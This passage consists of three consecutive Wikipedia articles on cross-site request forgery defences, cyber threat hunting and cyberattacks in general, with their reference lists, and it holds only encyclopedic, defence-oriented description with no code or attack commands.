Similarly to the cookie-to-header approach, but without involving JavaScript, a site can set a CSRF token as a cookie, and also insert it as a hidden field in each HTML form. When the form is submitted, the site can check that the cookie token matches the form token. The same-origin policy prevents an attacker from reading or setting cookies on the target domain, so they cannot put a valid token in their crafted form.
[
30
]


The advantage of this technique over the Synchronizer pattern is that the token does not need to be stored on the server.



SameSite cookie attribute
[
edit
]


An additional "SameSite" attribute can be included when the server sets a cookie, instructing the browser on whether to attach the cookie to cross-site requests. If this attribute is set to "strict", then the cookie will only be sent on same-site requests, making CSRF ineffective. However, this requires the browser to recognise and correctly implement the attribute.
[
31
]




Client-side safeguards
[
edit
]


Browser extensions such as RequestPolicy (for 
Mozilla Firefox
) or uMatrix (for both Firefox and 
Google Chrome
/
Chromium
) can prevent CSRF by providing a default-deny policy for cross-site requests. However, this can significantly interfere with the normal operation of many websites. The CsFire extension (also for Firefox) can mitigate the impact of CSRF with less impact on normal browsing, by removing authentication information from cross-site requests.

The 
NoScript
 extension for Firefox mitigates CSRF threats by distinguishing trusted from untrusted sites, and removing authentication & payloads from POST requests sent by untrusted sites to trusted ones. The Application Boundary Enforcer module in NoScript also blocks requests sent from internet pages to local sites (e.g. localhost), preventing CSRF attacks on local services (such as uTorrent) or routers.

The Self Destructing Cookies extension for Firefox does not directly protect from CSRF, but can reduce the attack window, by deleting cookies as soon as they are no longer associated with an open tab.



Other techniques
[
edit
]


Various other techniques have been used or proposed for CSRF prevention historically:



Verifying that the request's headers contain 
X-Requested-With
 (used by 
Ruby on Rails
 before v2.0 and 
Django
 before v1.2.5), or checking the HTTP 
Referer
 header and/or HTTP 
Origin
 header.
[
32
]


Checking the 
HTTP 
Referer
 header
 to see if the request is coming from an authorized page is commonly used for embedded network devices because it does not increase memory requirements. However, a request that omits the 
Referer
 header must be treated as unauthorized because an attacker can suppress the 
Referer
 header by issuing requests from FTP or HTTPS URLs. This strict 
Referer
 validation may cause issues with browsers or proxies that omit the 
Referer
 header for privacy reasons. Also, old versions of Flash (before 9.0.18) allow malicious Flash to generate GET or POST requests with arbitrary HTTP request headers using 
CRLF Injection
.
[
33
]
 Similar CRLF injection vulnerabilities in a client can be used to spoof the referrer of an HTTP request.


POST 
request method
 was for a while perceived as immune to trivial CSRF attacks using parameters in URL (using GET method). However, both POST and any other HTTP method can be now easily executed using 
XMLHttpRequest
. Filtering out unexpected GET requests still prevents some particular attacks, such as cross-site attacks using malicious image URLs or link addresses and cross-site information leakage through 
<script>
 elements (
JavaScript hijacking
); it also prevents (non-security-related) problems with aggressive 
web crawlers
 and 
link prefetching
.
[
1
]


Cross-site scripting
 (XSS) vulnerabilities (even in other applications running on the same domain) allow attackers to bypass essentially all CSRF preventions.
[
34
]




See also
[
edit
]


BREACH


Confused deputy problem


CRIME


Web Messaging


Heap spraying


Replay attack


Session fixation


Application security


References
[
edit
]






^ 
a
 
b
 
c
 
d
 
e
 
Shiflett, Chris (December 13, 2004). 
"Security Corner: Cross-Site Request Forgeries"
. php|architect (via shiflett.org)
. Retrieved 
2008-07-03
.




^ 
a
 
b
 
Ristic, Ivan (2005). 
Apache Security
. O'Reilly Media. p. 
280
. 
ISBN
 
0-596-00724-8
.




^
 
"What is Cross-Site Request Forgery (CSRF) and How Does It Work? | Synopsys"
.




^
 
"What is CSRF (Cross-site request forgery)? Tutorial & Examples"
. 
portswigger.net
. Retrieved 
2019-11-04
.




^
 
Burns, Jesse (2005). 
"Cross Site Request Forgery: An Introduction To A Common Web Weakness"
 
(PDF)
. Information Security Partners, LLC. Archived from 
the original
 
(PDF)
 on 2013-01-21
. Retrieved 
2011-12-12
.




^
 
Christey, Steve; Martin, Robert A. (May 22, 2007). 
"Vulnerability Type Distributions in CVE (version 1.1)"
. MITRE Corporation
. Retrieved 
2008-06-07
.




^
 
Washkuch Jr., Frank (October 17, 2006). 
"Netflix fixes cross-site request forgery hole"
. SC Magazine
. Retrieved 
2019-02-11
.




^ 
a
 
b
 
William Zeller; Edward W. Felten (October 2008). 
"Cross-Site Request Forgeries: Exploitation and Prevention"
 
(PDF)
. Retrieved 
29 May
 2015
.




^
 
Mike, Bailey (2009). 
"CSRF: Yeah, It Still Works…"
 
(PDF)
. DEFCON.




^
 
"Security Advisory: CSRF & DNS/DHCP/Web Attacks"
. 
Draytek
. May 2018
. Retrieved 
18 May
 2018
.




^
 


"Cross Site Request Forgery protection | Django documentation | Django"
. 
docs.djangoproject.com
. Retrieved 
2015-08-21
.




^
 
Adam Barth, Collin Jackson, and John C. Mitchell, 
Robust Defenses for Cross-Site Request Forgery
, 
Proceedings of the 15th ACM Conference on Computer and Communications Security,
 ACM 2008




^
 
Joseph Foulds, 
Passive monitoring login request forgery, Yahoo
 
Archived
 2014-12-22 at the 
Wayback Machine




^
 
"Cross-Site Request Forgery For POST Requests With An XML Body"
. pentestmonkey
. Retrieved 
September 4,
 2015
.




^
 
Sheeraj Shah (2008). 
"Web 2.0 Hacking Defending Ajax & Web Services"
 
(PDF)
. HITB
. Retrieved 
September 4,
 2015
.




^
 
"Security Fix - Weaponizing Web 2.0"
. Archived from 
the original
 on May 28, 2012.




^
 
Dynamic CSRF
 
Archived
 2010-02-13 at the 
Wayback Machine




^
 
Owasp.org: 
Israel 2012/01: AJAX Hammer – Harnessing AJAX for CSRF Attacks
 
Archived
 2013-10-01 at the 
Wayback Machine




^
 
Downloads – hasc-research – hasc-research – Google Project Hosting
. Code.google.com (2013-06-17). Retrieved on 2014-04-12.




^
 
"Vulnerability Note VU#584089 - cPanel XSRF vulnerabilities"
.




^
 
"Vulnerability Note VU#264385 - OpenCA allows Cross site request forgery (XSRF)"
.




^
 
"Enhanced cross-site attack prevention"
. 
Espacenet
. European Patent Office
. Retrieved 
21 November
 2019
.




^
 
"CSRF: Cross-site request forgery attacks explained"
. 
IONOS Digitalguide
. Retrieved 
2022-04-26
.




^
 
"Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet"
. OWASP
. Retrieved 
2019-07-19
.




^
 
"Valhalla Articles - Cross-Site Request Forgery: Demystified"
.




^
 
"Cross Site Request Forgery protection"
. Django. Archived from 
the original
 on 2015-01-20
. Retrieved 
2015-01-20
.




^
 
"Cross Site Request Forgery (XSRF) Protection"
. AngularJS
. Retrieved 
2015-01-20
.




^
 
"Making a Service Available Across Domain Boundaries"
.




^
 
Adamski, Lucas. 
"Cross-domain policy file usage recommendations for Flash Player - Adobe Developer Connection"
.




^
 
"Double Submit Cookie defence"
. OWASP.




^
 
"SameSite cookies"
. Mozilla. 10 April 2023.




^
 
Origin Header Proposal
 
Archived
 2016-03-08 at the 
Wayback Machine
. People.mozilla.org. Retrieved on 2013-07-29.




^
 
"Secunia Advisory SA22467"
. Secunia. 19 October 2006
. Retrieved 
11 September
 2012
.




^
 
Schneider, Christian. 
"CSRF and same-origin XSS"
. Archived from 
the original
 on 2012-08-14
. Retrieved 
2012-04-21
.






External links
[
edit
]


A Most-Neglected Fact About Cross Site Request Forgery


The Cross-Site Request Forgery FAQ


Cross-Site Request Forgery from The Web Application Security Consortium Threat Classification Project










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Cross-site_request_forgery&oldid=1244195177
"


Categories
: 
Web security exploits
Client-side web security exploits
Hidden categories: 
Webarchive template wayback links
Articles with short description
Short description is different from Wikidata
Articles needing additional references from May 2018
All articles needing additional references











From Wikipedia, the free encyclopedia






Proactive cyber defense activity


Cyber threat hunting
 is a 
proactive cyber defence activity
. It is "the process of proactively and iteratively searching through networks to detect and isolate advanced threats that evade existing security solutions."
[
1
]
 This is in contrast to traditional threat management measures, such as 
firewalls
, 
intrusion detection systems
 (IDS), malware 
sandbox (computer security)
 and 
SIEM
 systems, which typically involve an investigation of evidence-based data 
after
 there has been a warning of a potential threat.
[
2
]
[
3
]






Methodologies
[
edit
]


Overview
[
edit
]


In recent years, the world has seen an alarming rise in the number and severity of cyber attacks, data breaches, malware infections, and online fraud incidents. According to cyber security and ai company SonicWall, the number of ransomware attacks grew by 105% globally. Major corporations around the world have fallen victim to high-profile data breaches, with the average cost of a data breach now estimated at $4.24 million, according to 
IBM
.
[
4
]




Cyber threat hunting Methodologies
[
edit
]


Threat hunting has traditionally been a manual process, in which a security analyst sifts through various data information using their own knowledge and familiarity with the network to create hypotheses about potential threats, such as, but not limited to, 
lateral movement
 by 
threat actors
.
[
5
]
 To be even more effective and efficient, however, threat hunting can be partially automated, or machine-assisted, as well. In this case, the analyst uses software that leverages 
machine learning
 and 
user and entity behavior analytics
 (UEBA) to inform the analyst of potential risks. The analyst then investigates these potential risks, tracking suspicious behavior in the network. Thus, hunting is an iterative process, meaning that it must be continuously carried out in a loop, beginning with a hypothesis.



Analytics-Driven: "Machine-learning and UEBA, used to develop aggregated risk scores that can also serve as hunting hypotheses"


Situational-Awareness Driven: "Crown Jewel analysis, enterprise risk assessments, company- or employee-level trends"


Intelligence-Driven: "Threat intelligence reports, threat intelligence feeds, malware analysis, vulnerability scans"


The analysts research their hypothesis by going through vast amounts of data about the network. The results are then stored so that they can be used to improve the automated portion of the detection system and to serve as a foundation for future hypotheses.

The Detection Maturity Level (DML) model 
[
6
]
 expresses threat indicators can be detected at different semantic levels. High semantic indicators such as goal and strategy or 
tactics, techniques and procedures
 (TTPs) are more valuable to identify than low semantic indicators such as network artifacts and atomic indicators such as IP addresses.
[
7
]
[
8
]
 SIEM tools typically only provide indicators at relatively low semantic levels. There is therefore a need to develop SIEM tools that can provide threat indicators at higher semantic levels.
[
9
]




Indicators
[
edit
]


There are two types of indicators:



Indicator of compromise
 - An indicator of compromise (IOC)  tells you that an action has happened and you are in a reactive mode. This type of IOC is done by looking inward at your own data from transaction logs and or SIEM data. Examples of IOC include unusual network traffic, unusual privileged user account activity, login anomalies, increases in database read volumes, suspicious registry or system file changes, unusual DNS requests and Web traffic showing non-human behavior. These types of unusual activities allow security administration teams to spot malicious actors earlier in the 
cyberattack
 process.


Indicator of Concern - Using 
Open-source intelligence
 (OSINT), data can be collected from publicly available sources to be used for cyberattack detection and threat hunting.


Tactics, Techniques and Procedures (TTPs)
[
edit
]


The SANS Institute identifies a threat hunting maturity model as follows:
[
10
]




Initial - At Level 0 maturity, an organization relies primarily on automated reporting and does little or no routine 
data collection
.


Minimal - At Level 1 maturity, an organization incorporates threat intelligence indicator searches. It has a moderate or high level of routine data collection.


Procedural - At Level 2 maturity, an organization follows analysis procedures created by others. It has a high or very high level of routine data collection.


Innovative - At Level 3 maturity, an organization creates new data analysis procedures. It has a high or very high level of routine data collection.


Leading - At Level 4 maturity, automates the majority of successful data analysis procedures. It has a high or very high level of routine data collection.


Dwell Time
[
edit
]


The dwell time either indicates the entire span of a security incident (
initial compromise
 until 
detection and full cleanup
) or the 'mean time to detect' (from initial compromise until detection). According to the 2022 
Mandiant
 M-Trends Report, cyberattackers operate undetected for an average of 21 days (a 79% reduction, compared to 2016), but this varies greatly by region.
[
11
]
 Per Mandiant, the dwell time
[
12
]
 can be as low as 17 days (in the 
Americas
) or as high as 48 days (in 
EMEA
).
[
11
]
 The study also showed that 47% of attacks are discovered only after notification from an external party.



Example Reports
[
edit
]


Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms


Example Threat Hunting
[
edit
]


Threat hunting using DNS firewalls and data enrichment


Threat Hunting Methodologies
[
edit
]


Inside the Network Perimeter




Reactive Threat Hunting - This method is triggered by a malicious event, typically after a data breach or theft is discovered. Efforts are typically focused on forensics and remediation.


Proactive Threat Hunting - This method actively seeks out ongoing malicious events and activities inside the network, the goal is to detect an in progress cyber attack.  Efforts are typically focused on detection and remediation.


Outside the Network Perimeter




External Threat Hunting - This method proactively seeks out malicious threat actor infrastructure to map and predict where cyber attacks are likely to emerge to prepare defensive strategies.  Efforts are typically focused on Cyber Threat Reconnaissance, Threat Surface Mapping and monitoring of third-party risks.


See also
[
edit
]


Bug bounty program


Proactive cyber defense


References
[
edit
]






^
 
"Cyber threat hunting: How this vulnerability detection strategy gives analysts an edge - TechRepublic"
. 
TechRepublic
. Retrieved 
2016-06-07
.




^
 
"MITRE Kill Chain"
. Retrieved 
2020-08-27
.




^
 
"Threat Intelligence Platform on War Against Cybercriminals"
. Retrieved 
2019-02-17
.




^
 
"The Future of Cyber Security and AI: Protecting Your Digital World"
. 
Blue Big Data
. Retrieved 
October 13,
 2023
.




^
 
"Cyber Threat Intelligence (CTI) in a Nutshell"
. 
Medium.com
. Retrieved 
2020-07-27
.




^
 
Stillions, Ryan (2014). 
"The DML Model"
. 
Ryan Stillions security blog
.




^
 
Bianco, David (2014-01-17). 
"The Pyramid of Pain"
. 
detect-respond.blogspot.com
. Retrieved 
2023-07-01
.




^
 
Bianco, David. 
"The Pyramid of Pain"
. SANS Institute
. Retrieved 
2023-07-01
.




^
 
Bromander, Siri (2016). 
"Semantic Cyberthreat Modelling"
 
(PDF)
. Semantic Technology for Intelligence, Defense and Security (STIDS 2016).




^
 
Lee, Robert. 
"The Who, What, Where, When and How of Effective Threat Hunting"
. 
SANS Institute
. Retrieved 
29 May
 2018
.




^ 
a
 
b
 
"Mandian M-Trends 2022"
 
(PDF)
. 
Mandiant
. pp. 7, 9, 12, 16. 
Archived
 from the original on 2022-05-13
. Retrieved 
2022-05-16
.




^
 
In the Mandiant M-Trends report, dwell time 
"is calculated as the number of days an attacker is present in a victim environment before they are detected"
, which corresponds to the 'mean time to detect'.














Retrieved from "
https://en.wikipedia.org/w/index.php?title=Cyber_threat_hunting&oldid=1235825721
"


Category
: 
Computer security procedures
Hidden categories: 
Articles with short description
Short description matches Wikidata











From Wikipedia, the free encyclopedia






Attack on a computer system


"Cyberstrike" redirects here. For the online game, see 
CyberStrike
.




A 
cyberattack
 (or cyber attack) occurs when there is an unauthorized action against computer infrastructure that compromises the 
confidentiality, integrity, or availability
 of its content.

The rising dependence on increasingly complex and interconnected computer systems in most domains of life is the main factor that causes vulnerability to cyberattacks, since virtually all computer systems have 
bugs
 that can be 
exploited
 by attackers. Although it is impossible or impractical to create a perfectly secure system, there are many defense mechanisms that can make a system more difficult to attack. 

Perpetrators of a cyberattack can be criminals, 
hacktivists
, or states. They attempt to find weaknesses in a system, exploit them and create 
malware
 to carry out their goals, and deliver it to the targeted system. Once installed, the malware can have a variety of effects depending on its purpose. Detection of cyberattacks is often absent or delayed, especially when the malware attempts to spy on the system while remaining undiscovered. If it is discovered, the targeted organization may attempt to collect evidence about the attack, remove malware from its systems, and close the vulnerability that enabled the attack. 

Cyberattacks can cause a variety of harms to targeted individuals, organizations, and governments, including significant financial losses and 
identity theft
. They are usually illegal both as a method of crime and 
warfare
, although correctly attributing the attack is difficult and perpetrators are rarely prosecuted.





Definitions
[
edit
]


A cyberattack can be defined as any attempt by an individual or organization "using one or more computers and computer systems to steal, expose, change, disable or eliminate information, or to breach computer information systems, computer networks, and computer infrastructures".
[
1
]
 Definitions differ as to the type of compromise required – for example, requiring the system to produce unexpected responses or cause injury or property damage.
[
2
]
 Some definitions exclude attacks carried out by non-state actors and others require the target to be a state.
[
3
]
 Keeping a system secure relies on maintaining the 
CIA triad
: confidentiality (no unauthorized access), integrity (no unauthorized modification), and availability.
[
4
]
 Although availability is less important for some web-based services, it can be the most crucial aspect for industrial systems.
[
5
]




Prevalence
[
edit
]


In the first six months of 2017, two billion data records were stolen or impacted by cyber attacks, and 
ransomware
 payments reached 
US$2 billion
, double that in 2016.
[
6
]
 In 2020, with the increase of remote work as an effect of the COVID-19 global pandemic, cybersecurity statistics reveal a huge increase in hacked and breached data.
[
7
]
 The worldwide information security market is forecast to reach $170.4 billion in 2022.
[
8
]




Vulnerability
[
edit
]


Timeline of a software 
vulnerability
 that is discovered by attackers prior to a vendor (
zero day
) 


Over time, computer systems make up an increasing portion of daily life and interactions. While the increasing complexity and connectedness of the systems increases the efficiency, power, and convenience of computer technology, it also renders the systems more vulnerable to attack and worsens the consequences of an attack, should one occur.
[
9
]


Despite developers' goal of delivering a product that works entirely as intended, virtually all 
software
 and 
hardware
 contains bugs.
[
10
]
 If a bug creates a security risk, it is called a 
vulnerability
.
[
11
]
[
12
]
[
13
]
 
Patches
 are often released to fix identified vulnerabilities, but those that remain unknown (
zero days
) as well as those that have not been patched are still liable for exploitation.
[
14
]
 The software vendor is not legally liable for the cost if a vulnerability is used in an attack, which creates an incentive to make cheaper but less secure software.
[
15
]
 Vulnerabilities vary in their ability to be 
exploited
 by malicious actors. The most valuable allow the attacker to 
inject
 and run their own code (called 
malware
), without the user being aware of it.
[
11
]
 Without a vulnerability enabling access, the attacker cannot gain access to the system.
[
16
]




Protection
[
edit
]


Further information: 
Cybersecurity
 and 
cyber resilience


A system's architecture and design decisions play a major role in determining how safe it can be.
[
17
]
 The traditional approach to improving security is the detection of systems vulnerable to attack and 
hardening
 these systems to make attacks more difficult, but it is only partially effective.
[
18
]
   Formal 
risk assessment
 for compromise of highly complex and interconnected systems is impractical
[
19
]
 and the related question of how much to spend on security is difficult to answer.
[
20
]
  Because of the ever changing and uncertain nature of cyber-threats, risk assessment may produce scenarios that are costly or unaffordable to mitigate.
[
21
]
 As of 2019
[update]
, there are no commercially available, widely used 
active defense
 systems for protecting systems by intentionally increasing the complexity or variability of systems to make it harder to attack.
[
22
]
 The 
cyber resilience
 approach, on the other hand, assumes that breaches will occur and focuses on protecting essential functionality even if parts are compromised, using approaches such as 
micro-segmentation
, 
zero trust
, and 
business continuity planning
.
[
23
]


The majority of attacks can be prevented by ensuring all software is fully patched. Nevertheless, fully patched systems are still vulnerable to exploits using 
zero-day vulnerabilities
.
[
24
]
 The highest risk of attack occurs just after a vulnerability has been publicly disclosed or a patch is released, because attackers can create exploits faster than a patch can be developed and rolled out.
[
25
]


Software solutions aim to prevent unauthorized access and detect the intrusion of malicious software.
[
26
]
 Training users can avoid cyberattacks (for example, not to click on a suspicious link or email attachment), especially those that depend on user error.
[
4
]
[
27
]
 However, too many rules can cause employees to disregard them, negating any security improvement. Some insider attacks can also be prevented using rules and procedures.
[
27
]
 Technical solutions can prevent many causes of human error that leave data vulnerable to attackers, such as encrypting all sensitive data, preventing employees from using insecure passwords, installing 
antivirus software
 to prevent malware, and implementing a robust patching system to ensure that all devices are kept up to date.
[
28
]


There is little evidence about the effectiveness and cost-effectiveness of different cyberattack prevention measures.
[
26
]
 Although attention to security can reduce the risk of attack, achieving perfect security for a complex system is impossible, and many security measures have unacceptable cost or usability downsides.
[
29
]
 For example, reducing the complexity and functionality of the system is effective at reducing the 
attack surface
.
[
30
]
 
Disconnecting systems from the internet
 is one truly effective measure against attacks, but it is rarely feasible.
[
19
]
 In some jurisdictions, there are legal requirements for protecting against attacks.
[
31
]




Attack process and types
[
edit
]


See also: 
Computer security § Vulnerabilities and attacks


Intrusion 
kill chain
 for information security


Another model of the cyberattack chain


The 
cyber kill chain
 is the process by which perpetrators carry out cyberattacks.
[
32
]




Reconnaissance: would-be attackers search for information about the system in order to target it. They may seek out 
publicly available information
 or carry out 
social engineering attacks
 to obtain more information about the target's systems.
[
32
]


Weaponization: after finding a 
vulnerability
, attackers build an 
exploit
 to gain access, and 
malware
 to carry out the attack.
[
33
]


Delivery: once complete, the malware is delivered to the target.
[
33
]
 Most data breaches and malware insertions are enabled by 
phishing
, where the attacker sends a malicious communication, often an email, in an attempt to get the recipient to click on a link or attachment to deliver malware.
[
34
]
 
Drive-by-download
 does not require any clicks, only a visit to a malicious website.
[
34
]
 Sometimes insiders are behind the attack and can use their credentials to bypass security.
[
35
]
 Some attacks are delivered indirectly via associated companies that have a business relationship with the target. Others may be delivered by directly accessing hardware, particularly in the cases of bribery or 
blackmail
.
[
33
]


Exploitation: the attacker's software is executed on the targeted system, and often creates a 
backdoor
 to enable remote control by the attacker.
[
33
]


Many attackers will not launch an attack right away.
[
36
]
 The attacker often seeks to persist after system interruption (such as 
crash
 or restart), evade detection, and 
escalate privileges
, 
[
37
]
 and secure multiple channels of communication with its controllers.
[
36
]
 Other common actions include responding to remote controls and collecting and copying data to a device controlled by the attacker (
data exfiltration
).
[
37
]


Activity
[
edit
]


After the malware is installed, its activity varies greatly depending on the attacker's goals.
[
38
]
 Many attackers try to eavesdrop on a system without affecting it. Although this type of malware can have unexpected 
side effects
, it is often very difficult to detect.
[
39
]
 
Botnets
 are networks of compromised devices that can be used to send 
spam
 or carry out
[
40
]
 
denial-of-service
 attacks—flooding a system with too many requests for the system to handle at once, causing it to become unusable.
[
34
]
 Attackers may also use computers to mine 
cryptocurrencies
, such as 
Bitcoin
, for their own profit.
[
41
]


Ransomware
 is software used to encrypt or destroy data; attackers demand payment for the restoration of the targeted system. The advent of 
cryptocurrency
 enabling anonymous transactions has led to a dramatic increase in ransomware demands.
[
42
]




Perpetrators and motivations
[
edit
]


Website defacement
: 
Lapsus$
 hackers replaced the content of a website


The stereotype of a hacker is an individual working for himself. However, many cyber threats are teams of well-resourced experts.
[
43
]
 "Growing  revenues  for  cyber  criminals  are  leading  to  more  and  more  attacks,  increasing  professionalism  and  highly  specialized  attackers.  In  addition,  unlike  other  forms  of  crime, cybercrime  can  be  carried  out  remotely,  and  cyber  attacks  often  scale  well."
[
44
]
 Many cyberattacks are caused or enabled by insiders, often employees who bypass security procedures to get their job done more efficiently.
[
45
]
 Attackers vary widely in their skill and sophistication and well as their determination to attack a particular target, as opposed to opportunistically picking one easy to attack.
[
45
]
 The skill level of the attacker determined which types of attacks they are prepared to mount.
[
46
]
 The 
most sophisticated attackers
 can persist undetected on a hardened system for an extended period of time.
[
45
]


Motivations and aims also differ. Depending whether the expected threat is passive espionage, data manipulation, or active hijacking, different mitigation methods may be needed.
[
39
]


Software vendors and governments are mainly interested in undisclosed vulnerabilities (
zero-days
),
[
47
]
 while organized crime groups are more interested in ready-to-use 
exploit kits
 based on known vulnerabilities,
[
48
]
[
49
]
  which are much cheaper.
[
50
]
 The lack of transparency in the market causes problems, such as buyers being unable to guarantee that the zero-day vulnerability was not sold to another party.
[
51
]
 Both buyers and sellers advertise on the 
dark web
 and use 
cryptocurrency
 for untraceable transactions.
[
52
]
[
53
]
 Because of the difficulty in writing and maintaining software that can attack a wide variety of systems, criminals found they could make more money by renting out their exploits rather than using them directly.
[
54
]


Cybercrime as a service
, where hackers sell prepacked software that can be used to cause a cyberattack, is increasingly popular as a lower risk and higher profit activity than traditional hacking.
[
53
]
 A major form of this is to create a botnet of compromised devices and rent or sell it to another cybercriminal. Different botnets are equipped for different tasks such as DDOS attacks or password cracking.
[
55
]
 It is also possible to buy the software used to create a botnet
[
56
]
 and 
bots
 that load the purchaser's malware onto a botnet's devices.
[
57
]
 DDOS as a service using botnets retained under the control of the seller is also common, and may be the first cybercrime as a service product, and can also be committed by 
SMS flooding
 on the cellular network.
[
58
]
  Malware and ransomware as a service have made it possible for individuals without technical ability to carry out cyberattacks.
[
59
]




Targets and consequences
[
edit
]


Top ten industries targeted by cyberattacks in the United States in 2020


Total annualized cyberattack cost by attack type, 2016–2017


Targets of cyberattacks range from individuals to corporations and government entities.
[
9
]
 Many cyberattacks are foiled or unsuccessful, but those that succeed can have devastating consequences.
[
19
]
 Understanding the negative effects of cyberattacks helps organizations ensure that their prevention strategies are cost-effective.
[
26
]
 One paper classifies the harm caused by cyberattacks in several domains:
[
60
]




Physical damage, including injury or death or destruction of property
[
61
]


Digital damage, such as the destruction of data or introduction of malware
[
61
]


Economic losses, such as those caused by disrupted operations, the cost of investigation, or regulatory fines.
[
61
]


Psychological harm
, such as users being upset that their data has been leaked
[
62
]


Reputational damage
, loss of reputation caused by the attack
[
63
]


Negative 
externalities
 to society at large, such as consumers losing access to an important service because of the attack.
[
64
]


Consumer data
[
edit
]


Main article: 
Data breach


Data breaches reported in the United States by year, 2005–2023


Thousands of 
data records
 are stolen from individuals every day.
[
9
]
 According to a 2020 estimate, 55 percent of data breaches were caused by 
organized crime
, 10 percent by 
system administrators
, 10 percent by 
end users
 such as customers or employees, and 10 percent by states or state-affiliated actors.
[
65
]
 Opportunistic criminals may cause data breaches—often using 
malware
 or 
social engineering attacks
, but they will typically move on if the security is above average. More organized criminals have more resources and are more focused in their 
targeting of particular data
.
[
66
]
 Both of them sell the information they obtain for financial gain.
[
67
]
 Another source of data breaches are 
politically motivated hackers
, for example 
Anonymous
, that target particular objectives.
[
68
]
 State-sponsored hackers target either citizens of their country or foreign entities, for such purposes as 
political repression
 and 
espionage
.
[
69
]


After a data breach, criminals make money by selling data, such as usernames, passwords, 
social media
 or 
customer loyalty
 account information, 
debit
 and 
credit card
 numbers,
[
67
]
 and personal health information (see 
medical data breach
).
[
70
]
 This information may be used for a variety of purposes, such as 
spamming
, obtaining products with a victim's loyalty or payment information, 
prescription drug fraud
, 
insurance fraud
,
[
71
]
 and especially 
identity theft
.
[
41
]
  Consumer losses from a breach are usually a negative 
externality
 for the business.
[
72
]




Critical infrastructure
[
edit
]


Out-of-service gas pumps due to 
panic buying
 after the 
Colonial Pipeline cyberattack
 in 
Oak Hill, Virginia


Critical infrastructure
 is that considered most essential—such as healthcare, water supply, transport, and financial services—which has been increasingly governed by 
cyber-physical systems
 that depend on network access for their functionality.
[
73
]
[
74
]
 For years, writers have warned of cataclysmic consequences of cyberattacks that have failed to materialize as of 2023
[update]
.
[
75
]
 These extreme scenarios could still occur, but many experts consider that it is unlikely that challenges in inflicting physical damage or spreading terror can be overcome.
[
75
]
 Smaller-scale cyberattacks, sometimes resulting in interruption of essential services, regularly occur.
[
76
]




Corporations and organizations
[
edit
]


There is little empirical evidence of economic harm (such as 
reputational damage
) from breaches except the direct cost
[
77
]
 for such matters as legal, technical, and public relations recovery efforts.
[
78
]
 Studies that have attempted to correlate cyberattacks to short-term declines in 
stock prices
 have found contradictory results, with some finding modest losses, others finding no effect, and some researchers criticizing these studies on methodological grounds. The effect on stock price may vary depending on the type of attack.
[
79
]
 Some experts have argued that the evidence suggests there is not enough direct costs or reputational damage from breaches to sufficiently 
incentivize
 their prevention.
[
80
]
[
81
]




Governments
[
edit
]


In 2022, government websites of Costa Rica 
were down because of
 a 
ransomware
 attack.


Government websites and services are among those affected by cyberattacks.
[
76
]
 Some experts hypothesize that cyberattacks weaken societal trust or trust in the government, but as of 2023
[update]
 this notion has only limited evidence.
[
75
]




Responses
[
edit
]


See also: 
Computer security incident management


Responding quickly to attacks is an effective way to limit the damage. The response is likely to require a wide variety of skills, from technical investigation to legal and public relations.
[
82
]
 Because of the prevalence of cyberattacks, some companies plan their incident response before any attack is detected, and may designate a 
computer emergency response team
 to be prepared to handle incidents.
[
83
]
[
84
]




Detection
[
edit
]


Many attacks are never detected. Of those that are, the average time to discovery is 197 days.
[
85
]
 Some systems can detect and flag anomalies that may indicate an attack, using such technology as 
antivirus
, 
firewall
, or an 
intrusion detection system
. Once suspicious activity is suspected, investigators look for 
indicators of attack
 and 
indicators of compromise
.
[
86
]
  Discovery is quicker and more likely if the attack targets information availability (for example with a 
denial-of-service attack
) rather than integrity (modifying data) or confidentiality (copying data without changing it).
[
87
]
 State actors are more likely to keep the attack secret. Sophisticated attacks using valuable exploits are more less likely to be detected or announced – as the perpetrator wants to protect the usefulness of the exploit.
[
87
]


Evidence collection is done immediately, prioritizing 
volatile
 evidence that is likely to be erased quickly.
[
88
]
  Gathering data about the breach can facilitate later litigation or criminal prosecution,
[
89
]
 but only if the data is gathered according to legal standards and the 
chain of custody
 is maintained.
[
90
]
[
88
]




Recovery
[
edit
]


Containing the affected system is often a high priority after an attack, and may be enacted by shutoff, isolation, use of a sandbox system to find out more about the adversary
[
88
]
 
patching
 the vulnerability, and 
rebuilding
.
[
91
]
 Once the exact way that the system was compromised is identified, there is typically only one or two technical vulnerabilities that need to be addressed in order to contain the breach and prevent it from reoccurring.
[
92
]
 A 
penetration test
 can then verify that the fix is working as expected.
[
93
]
 If 
malware
 is involved, the organization must investigate and close all infiltration and exfiltration vectors, as well as locate and remove all malware from its systems.
[
94
]
 Containment can compromise investigation, and some tactics (such as shutting down servers) can violate the company's contractual obligations.
[
95
]
 After the breach is fully contained, the company can then work on restoring all systems to operational.
[
96
]
 Maintaining a 
backup
 and having tested incident response procedures are used to improve recovery.
[
23
]




Attribution
[
edit
]


See also: 
Cyber attribution
 and 
Cyber forensics


Attributing a cyberattack is difficult, and of limited interest to companies that are targeted by cyberattacks. In contrast, 
secret services
 often have a compelling interest in finding out whether a state is behind the attack.
[
97
]
 Unlike attacks carried out in person, determining the entity behind a cyberattack is difficult.
[
98
]
 A further challenge in attribution of cyberattacks is the possibility of a 
false flag attack
, where the actual perpetrator makes it appear that someone else caused the attack.
[
97
]
 Every stage of the attack may leave 
artifacts
, such as entries in log files, that can be used to help determine the attacker's goals and identity.
[
99
]
 In the aftermath of an attack, investigators often begin by saving as many artifacts as they can find,
[
100
]
  and then try to determine the attacker.
[
101
]
 Law enforcement agencies may investigate cyber incidents
[
102
]
 although the hackers responsible are rarely caught.
[
103
]




Legality
[
edit
]


See also: 
Tallinn Manual


Most states agree that cyberattacks are regulated under the laws governing the 
use of force in international law
,
[
104
]
 and therefore cyberattacks as a form of warfare are likely to violate the prohibition of aggression.
[
105
]
 Therefore, they could be prosecuted as a 
crime of aggression
.
[
106
]
 There is also agreement that cyberattacks are governed by 
international humanitarian law
,
[
104
]
 and if they target civilian infrastructure, they could be prosecuted as a 
war crime
, 
crime against humanity
, or act of 
genocide
.
[
106
]
 International courts cannot enforce these laws without sound attribution of the attack, without which countermeasures by a state are not legal either.
[
107
]


In many countries, cyberattacks are prosecutable under various laws aimed at 
cybercrime
.
[
108
]
 Attribution of the attack 
beyond reasonable doubt
 to the accused is also a major challenge in criminal proceedings.
[
109
]
 In 2021, 
United Nations member states
 began negotiating a 
draft cybercrime treaty
.
[
110
]


Many jurisdictions have 
data breach notification laws
